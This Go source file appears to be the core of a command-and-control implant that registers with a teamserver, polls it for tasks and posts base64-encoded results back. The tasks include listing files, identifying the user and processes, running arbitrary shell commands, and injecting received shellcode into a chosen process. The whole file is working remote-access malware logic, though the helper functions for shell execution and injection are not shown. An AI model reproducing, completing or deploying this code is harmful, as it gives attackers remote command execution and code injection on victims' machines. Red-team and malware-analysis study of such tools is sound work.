package main

import (
	"encoding/json"
	"fmt"
	"os"
	"os/user"
	"strings"
	"time"
	"strconv"
)

var (
	Teamserver    = "http://127.0.0.1"
	Port          = "80"
	URL           string
	RegisterAgent string
	GetTask       string
	PostResult    string
)

type Agent struct {
	IP       string
	Hostname string
	Sleep    string
	UID      string
}

type TaskResult struct {
	CommandID string `json:"CommandID"`
	Result    string `json:"Result"`
}

func init() {
	URL = Teamserver + ":" + Port
	RegisterAgent = URL + "/register"
	GetTask = URL + "/tasks"
	PostResult = URL + "/results"
}

func register(agent Agent, endpoint string) ([]byte, error) {
	jsonAgent, err := json.Marshal(agent)
	if err != nil {
		fmt.Println(err)
		return nil, err
	}

	res, err := http_post_json(endpoint, jsonAgent)
	if err != nil {
		fmt.Println(err)
		return nil, err
	}

	return res, nil
}

func check_tasks(agent Agent, endpoint string) ([]byte, error) {
	res, err := http_get(endpoint + "/" + agent.UID)
	if err != nil {
		fmt.Println(err)
		return nil, err
	}

	return res, nil
}

func post_results(agent Agent, endpoint string, result []byte, command_id string) ([]byte, error) {
	res, err := http_post_json(endpoint+"/"+command_id, result)
	if err != nil {
		fmt.Println(err)
		return nil, err
	}

	return res, nil
}

func main() {
	user, err := user.Current()
	if err != nil {
		fmt.Println(err)
		return
	}

	// AGENT CONFIG (please change this)
	agent := Agent{
		IP:       "127.0.0.1",
		Hostname: user.Username,
		Sleep:    "5",
		UID:      "",
	}

	fmt.Println("[*] Registering agent")

	res, err := register(agent, RegisterAgent)
	if err != nil {
		fmt.Println(err)
		return
	}

	var json_data map[string]interface{}
	err = json.Unmarshal(res, &json_data)
	if err != nil {
		fmt.Println(err)
		return
	}

	agent.UID = json_data["uid"].(string)

	fmt.Println("[*] Agent registered successfully")

	fmt.Println("[*] Sleep: " + agent.Sleep + " seconds")

	for {
		fmt.Println("[*] Sleeping...")
		time.Sleep(5 * time.Second)

		fmt.Println("[*] Checking for tasks")
		res, err := check_tasks(agent, GetTask)
		if err != nil {
			fmt.Println("[!] Error getting tasks, going back to sleep...")
			fmt.Println(err)
			return
		}

		var json_data map[string]interface{}
		err = json.Unmarshal(res, &json_data)
		if err != nil {
			fmt.Println(err)
			return
		}

		// fmt.Println(json_data)
		if json_data["message"] == "No tasks found" {
			fmt.Println("[*] No tasks found, going back to sleep...")
			continue
		}

		tasks := json_data["tasks"].([]interface{})
		task := tasks[0].(map[string]interface{})
		command := task["Command"].(string)

		temp := strings.Split(command, " ")
		command_args := []string{""}

		if len(temp) > 1 {
			command_args = temp[1:]
			command = temp[0]
		}

		switch command {
		case "ls":
			fmt.Println("[*] Found 'ls', executing command")
			cwd, err := os.Getwd()
			if err != nil {
				fmt.Println("[!] Error getting current working directory")
				fmt.Println(err)
				return
			}

			fmt.Println("[*] Current working directory: " + cwd)

			files, err := ls(cwd)
			if err != nil {
				fmt.Println("[!] Error listing files")
				fmt.Println(err)
				return
			}

			jsonFiles, err := json.Marshal(files)
			if err != nil {
				fmt.Println("[!] Error marshalling files")
				fmt.Println(err)
				return
			}

			command_id := task["CommandID"].(string)
			result := b64_encode((jsonFiles))

			result_struct := TaskResult{
				CommandID: command_id,
				Result:    result,
			}

			jsonResult, err := json.Marshal(result_struct)
			if err != nil {
				fmt.Println("[!] Error marshalling result")
				fmt.Println(err)
				return
			}

			fmt.Println("[*] Sending results to teamserver...")

			_, err = post_results(agent, PostResult, jsonResult, command_id)
			if err != nil {
				fmt.Println("[!] Error posting results")
				fmt.Println(err)
				return
			}

			fmt.Println("[*] Results sent successfully")

		case "whoami":
			fmt.Println("[*] Found 'whoami', executing command")

			command_id := task["CommandID"].(string)
			result := b64_encode([]byte(whoami()))

			result_struct := TaskResult{
				CommandID: command_id,
				Result:    result,
			}

			jsonResult, err := json.Marshal(result_struct)
			if err != nil {
				fmt.Println("[!] Error marshalling result")
				fmt.Println(err)
				return
			}

			fmt.Println("[*] Sending results to teamserver...")
			fmt.Println(string(jsonResult))
			_, err = post_results(agent, PostResult, jsonResult, command_id)
			if err != nil {
				fmt.Println("[!] Error posting results")
				fmt.Println(err)
				return
			}

			fmt.Println("[*] Results sent successfully")

		case "pwd":
			fmt.Println("[*] Found 'pwd', executing command")
			command_id := task["CommandID"].(string)
			result := b64_encode([]byte(pwd()))

			result_struct := TaskResult{
				CommandID: command_id,
				Result:    result,
			}

			jsonResult, err := json.Marshal(result_struct)
			if err != nil {
				fmt.Println("[!] Error marshalling result")
				fmt.Println(err)
				return
			}

			fmt.Println("[*] Sending results to teamserver...")
			fmt.Println(string(jsonResult))

			_, err = post_results(agent, PostResult, jsonResult, command_id)
			if err != nil {
				fmt.Println("[!] Error posting results")
				fmt.Println(err)
				return
			}

			fmt.Println("[*] Results sent successfully")

		case "shell":
			fmt.Println("[*] Found 'shell', executing command")
			fmt.Println("[*] Shell Args: " + strings.Join(command_args, " "))
			command_id := task["CommandID"].(string)
			shell_res, err := shell(strings.Join(command_args, " "))
			if err != nil {
				fmt.Println("[!] Error executing shell command")
				fmt.Println(err)
				return
			}

			result := b64_encode([]byte(shell_res))

			result_struct := TaskResult{
				CommandID: command_id,
				Result:    result,
			}

			jsonResult, err := json.Marshal(result_struct)
			if err != nil {
				fmt.Println("[!] Error marshalling result")
				fmt.Println(err)
				return
			}

			fmt.Println("[*] Sending results to teamserver...")
			fmt.Println(string(jsonResult))

			_, err = post_results(agent, PostResult, jsonResult, command_id)

			if err != nil {
				fmt.Println("[!] Error posting results")
				fmt.Println(err)
				return
			}

			fmt.Println("[*] Results sent successfully")

		case "ps":
			fmt.Println("[*] Found 'ps', executing command")
			command_id := task["CommandID"].(string)
			ps_res, err := ps()
			if err != nil {
				fmt.Println("[!] Error executing ps command")
				fmt.Println(err)
				return
			}

			result := b64_encode([]byte(ps_res))

			result_struct := TaskResult{
				CommandID: command_id,
				Result:    result,
			}

			jsonResult, err := json.Marshal(result_struct)
			if err != nil {
				fmt.Println("[!] Error marshalling result")
				fmt.Println(err)
				return
			}

			fmt.Println("[*] Sending results to teamserver...")
			fmt.Println(string(jsonResult))

			_, err = post_results(agent, PostResult, jsonResult, command_id)

			if err != nil {
				fmt.Println("[!] Error posting results")
				fmt.Println(err)
				return
			}

			fmt.Println("[*] Results sent successfully")

		case "getpid":
			fmt.Println("[*] Found 'getpid', executing command")
			command_id := task["CommandID"].(string)
			pid_res := get_pid()

			result := b64_encode([]byte(pid_res))

			result_struct := TaskResult{
				CommandID: command_id,
				Result:    result,
			}

			jsonResult, err := json.Marshal(result_struct)
			if err != nil {
				fmt.Println("[!] Error marshalling result")
				fmt.Println(err)
				return
			}

			fmt.Println("[*] Sending results to teamserver...")
			fmt.Println(string(jsonResult))

			_, err = post_results(agent, PostResult, jsonResult, command_id)

			if err != nil {
				fmt.Println("[!] Error posting results")
				fmt.Println(err)
				return
			}

			fmt.Println("[*] Results sent successfully")
		
		case "inject":
			fmt.Println("[*] Found 'inject', executing command")
			fmt.Println("[*] Inject Args: " + strings.Join(command_args, " "))
			command_id := task["CommandID"].(string)
			PID := command_args[0]
			PIDInt, err := strconv.Atoi(PID)
			if err != nil {
				fmt.Println("[!] Error converting PID to integer")
				fmt.Println(err)
				return
			}

			shellcode, err := b64_decode(command_args[1])
			if err != nil {
				fmt.Println("[!] Error converting PID to integer")
				fmt.Println(err)
				return
			}

			inject_res, err := inject(PIDInt, shellcode)
			if err != nil {
				fmt.Println("[!] Error injecting shellcode")
				fmt.Println(err)
				return
			}

			var result string
			if inject_res == "OK" {
				result = b64_encode([]byte("Shellcode injected successfully"))
			} else {
				result = b64_encode([]byte("Error injecting shellcode"))
			}

			result_struct := TaskResult{
				CommandID: command_id,
				Result:    result,
			}

			jsonResult, err := json.Marshal(result_struct)
			if err != nil {
				fmt.Println("[!] Error marshalling result")
				fmt.Println(err)
				return
			}

			fmt.Println("[*] Sending results to teamserver...")

			_, err = post_results(agent, PostResult, jsonResult, command_id)
			if err != nil {
				fmt.Println("[!] Error posting results")
				fmt.Println(err)
				return
			}

			fmt.Println("[*] Results sent successfully")

		default:
			fmt.Println("[!] Command not found")
		}
	}
}
